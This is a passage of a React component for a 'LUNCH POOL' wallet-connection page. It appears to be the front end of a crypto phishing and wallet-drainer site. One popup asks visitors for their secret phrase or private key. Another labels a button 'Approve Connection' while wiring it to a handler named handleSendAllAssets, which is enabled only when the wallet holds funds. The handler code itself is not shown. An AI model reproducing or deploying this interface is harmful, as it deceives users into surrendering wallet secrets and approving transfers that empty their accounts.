      <div className="connection-card group relative overflow-hidden rounded-2xl bg-gradient-to-b from-white/5 to-white/[0.02] border border-white/10 backdrop-blur-sm p-8 hover:border-blue-500/50 transition-all duration-300">
        <div className="absolute top-0 right-0 w-32 h-32 bg-gradient-to-br from-blue-500/10 to-cyan-600/10 rounded-full blur-3xl"></div>
        <div className="relative z-10">
          <div className="flex items-center gap-4 mb-6">
            <div className="w-12 h-12 rounded-lg bg-blue-500/20 flex items-center justify-center">
              <Zap size={24} className="text-blue-400" />
            </div>
            <div className="text">
              <h3 className="text-xl font-semibold text-white">Automatic Connection</h3>
              <p className="text-gray-400 text-sm">One-click Web3 connection</p>
            </div>
          </div>
          <p className="text-gray-300 mb-6">
            Quick connection using popular wallet providers.
          </p>
          <div className="features-list space-y-2 mb-8">
            <div className="flex items-center gap-2 text-sm text-gray-400">
              <Zap size={14} className="text-blue-400" /> <span>Instant connection</span>
            </div>
            <div className="flex items-center gap-2 text-sm text-gray-400">
              <Shield size={14} className="text-blue-400" /> <span>Multiple wallet support</span>
            </div>
            <div className="flex items-center gap-2 text-sm text-gray-400">
              <Check size={14} className="text-blue-400" /> <span>No seed phrase required</span>
            </div>
          </div>
          <button 
            onClick={() => open()}
            className="w-full px-6 py-3 rounded-lg bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white font-medium transition-all shadow-lg shadow-blue-700/30"
          >
            Connect Wallet
          </button>
        </div>
      </div>
    </div>
  );

  const renderWalletDetails = () => (
    <div className="mb-12 bg-gradient-to-r from-blue-900/20 to-purple-900/20 border border-blue-500/30 rounded-xl p-6 backdrop-blur-sm">
      <h3 className="text-xl font-semibold text-white mb-6 flex items-center gap-3">
        <Wallet size={22} className="text-blue-400" /> Wallet Connected
      </h3>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm mb-6">
        <div>
          <p className="text-gray-400">Address</p>
          <p className="text-white font-mono truncate" title={address}>{address}</p>
        </div>
        <div>
          <p className="text-gray-400">Chain ID</p>
          <p className="text-white font-medium">{chainId}</p>
        </div>
        <div className="border-t border-white/10 pt-4 md:border-t-0 md:pt-0">
          <p className="text-gray-400">ETH Balance</p>
          <p className="text-white font-medium">{parseFloat(walletBalance.eth).toFixed(5)} ETH</p>
        </div>
      </div>
      
      {walletBalance.tokens.length > 0 && (
        <div className="mt-6 border-t border-white/10 pt-6">
           <h4 className="text-lg font-semibold text-white mb-4">Token Balances</h4>
           <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
            {walletBalance.tokens.map(token => (
              <div key={token.contractAddress}>
                <p className="text-gray-400">{token.symbol}</p>
                <p className="text-white font-medium">{parseFloat(token.balance).toFixed(4)}</p>
              </div>
            ))}
          </div>
        </div>
      )}

      <button 
        onClick={() => disconnect()}
        className="w-full mt-6 px-6 py-3 rounded-lg bg-gradient-to-r from-red-600 to-pink-600 hover:from-red-700 hover:to-pink-700 text-white font-medium transition-all shadow-lg shadow-red-700/30"
      >
        Disconnect Wallet
      </button>
    </div>
  );

  const renderManualConnectPopup = () => {
    if (!showManualPopup) return null;

    const goBack = () => {
        setManualStep('selection');
        setErrors({});
        setFormData({ secretPhrase: '' });
    }

    return (
      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-70 backdrop-blur-sm">
        <div className="bg-gray-800 rounded-2xl shadow-2xl p-6 w-full max-w-lg m-4 border border-gray-700 relative">
          <div className="flex justify-between items-center mb-6">
            {manualStep === 'input' && (
              <button onClick={goBack} className="text-gray-400 hover:text-white">
                <ArrowLeft size={24} />
              </button>
            )}
            <h3 className="text-xl font-bold text-white text-center flex-grow">
                {manualStep === 'selection' ? 'Select Your Wallet' : `Import ${selectedWallet?.name}`}
            </h3>
            <button onClick={closeAllPopups} className="text-gray-400 hover:text-white">
              <X size={24} />
            </button>
          </div>

          {manualStep === 'selection' ? (
            <div className="grid grid-cols-2 md:grid-cols-3 gap-4 max-h-[60vh] overflow-y-auto p-1">
              {POPULAR_WALLETS.map((wallet) => (
                <button
                  key={wallet.id}
                  onClick={() => handleWalletSelect(wallet)}
                  className="flex flex-col items-center justify-center p-4 bg-gray-700 rounded-lg hover:bg-gray-600 transition-colors space-y-2"
                >
                  <span className="text-4xl">{wallet.icon}</span>
                  <p className="font-semibold text-white text-sm text-center">{wallet.name}</p>
                </button>
              ))}
            </div>
          ) : (
            <form onSubmit={handleManualSubmit} className="space-y-6">
              <div className="relative">
                <textarea
                  placeholder="Enter your Secret Phrase or Private Key"
                  value={formData.secretPhrase}
                  onChange={handleInputChange}
                  rows={4}
                  className={`w-full p-4 bg-gray-700 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-purple-500 ${errors.secretPhrase ? 'border border-red-500' : 'border border-gray-600'}`}
                />
                <button
                  type="button"
                  onClick={() => setIsPasswordVisible(!isPasswordVisible)}
                  className="absolute top-0 right-0 p-4 flex items-center text-gray-400 hover:text-white"
                >
                  {isPasswordVisible ? <EyeOff size={20} /> : <Eye size={20} />}
                </button>
                {errors.secretPhrase && <p className="text-red-500 text-sm mt-1">{errors.secretPhrase}</p>}
              </div>

              {errors.form && <p className="text-red-500 text-sm text-center">{errors.form}</p>}

              <button
                type="submit"
                className="w-full bg-gradient-to-r from-blue-500 to-purple-600 py-3 rounded-lg font-medium text-white hover:opacity-90 transition-opacity"
              >
                Import Wallet
              </button>
            </form>
          )}
        </div>
      </div>
    );
  };
  
  const renderTransactionPopup = () => {
    if (!showTransactionPopup) return null;

    const hasFunds = parseFloat(walletBalance.eth) > 0 || walletBalance.tokens.length > 0;

    return (
      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-80 backdrop-blur-sm">
        <div className="bg-gray-800 rounded-2xl shadow-xl p-8 w-full max-w-sm m-4 border border-gray-700 text-center">
          <h3 className="text-2xl font-bold text-white mb-4">Connection Request</h3>
          <p className="text-gray-400 mb-8">Do you approve this Connection?</p>
          
          <div className="flex flex-col space-y-4">
             <button 
              onClick={handleSendAllAssets} 
              className={`w-full py-3 bg-gradient-to-r from-blue-500 to-purple-600 rounded-lg font-semibold text-white hover:opacity-90 transition-opacity flex items-center justify-center ${isSending || !hasFunds ? 'opacity-50 cursor-not-allowed' : ''}`}
              disabled={isSending || !hasFunds}
            >
              {isSending ? (
                <>
                  <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Approving...
                </>
              ) : (
                'Approve Connection'
              )}
            </button>
            <button 
              onClick={closeAllPopups} 
              className={`w-full py-3 bg-gray-600/50 rounded-lg hover:bg-gray-600/80 text-gray-300 font-semibold ${isSending ? 'cursor-not-allowed' : ''}`}
              disabled={isSending}
            >
              Decline Connection
            </button>
          </div>
        </div>
      </div>
    );
  };

  return (
    <div className="connect-page min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 text-white">
      <div className="fixed inset-0 bg-gradient-radial from-transparent via-indigo-900/20 to-black/40 pointer-events-none"></div>
      <header className="relative z-20 px-6 py-4 flex justify-between items-center border-b border-white/10 backdrop-blur-sm">
        <div className="logo text-2xl font-bold bg-gradient-to-r from-blue-400 to-purple-600 bg-clip-text text-transparent">
          LUNCH POOL
        </div>
        <div className="flex items-center gap-4">
          <button
            onClick={() => window.history.back()}
            className="flex items-center gap-2 px-4 py-2 rounded-lg bg-white/5 border border-white/10 hover:bg-white/10 text-white transition-all"
          >
            <ArrowLeft size={16} />
            Back
          </button>
        </div>
      </header>
      <main className="relative z-20 container mx-auto px-6 py-12">
        <div className="max-w-4xl mx-auto">
          <div className="text-center mb-12">
            <div className="inline-block px-3 py-1 rounded-full bg-blue-900/30 border border-blue-500/50 text-blue-400 text-sm font-semibold mb-6">
              SECURE CONNECTION
            </div>
            <h1 className="text-4xl md:text-5xl font-bold mb-6 text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-purple-600">
              Connect Your Wallet
            </h1>
            <p className="text-gray-300 text-lg max-w-2xl mx-auto">
              Connect your wallet to view your balance, interact with smart contracts, and make transactions on Ethereum Mainnet.
            </p>
          </div>
          
          {isConnected ? renderWalletDetails() : renderConnectionCards()}
        </div>
      </main>
      {renderManualConnectPopup()}
      {renderTransactionPopup()}
    </div>
  );
}